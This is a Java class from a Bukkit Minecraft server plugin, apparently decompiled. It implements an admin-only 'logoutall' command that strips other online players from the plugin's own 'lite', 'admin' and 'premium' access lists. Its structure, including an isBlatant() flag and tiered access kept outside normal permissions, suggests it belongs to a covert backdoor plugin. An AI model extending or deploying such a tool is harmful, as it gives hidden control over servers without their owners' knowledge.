
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LogoutallCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.admin.contains(p2.getName())) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (a2.getName().equals(p2.getName()) || !plugin.lite.contains(a2.getName())) continue;
                plugin.lite.remove(a2.getName());
                plugin.admin.remove(a2.getName());
                plugin.premium.remove(a2.getName());
            }
            p2.sendMessage(Settings.PREFIX("All users have been logged out!"));
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "admin " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

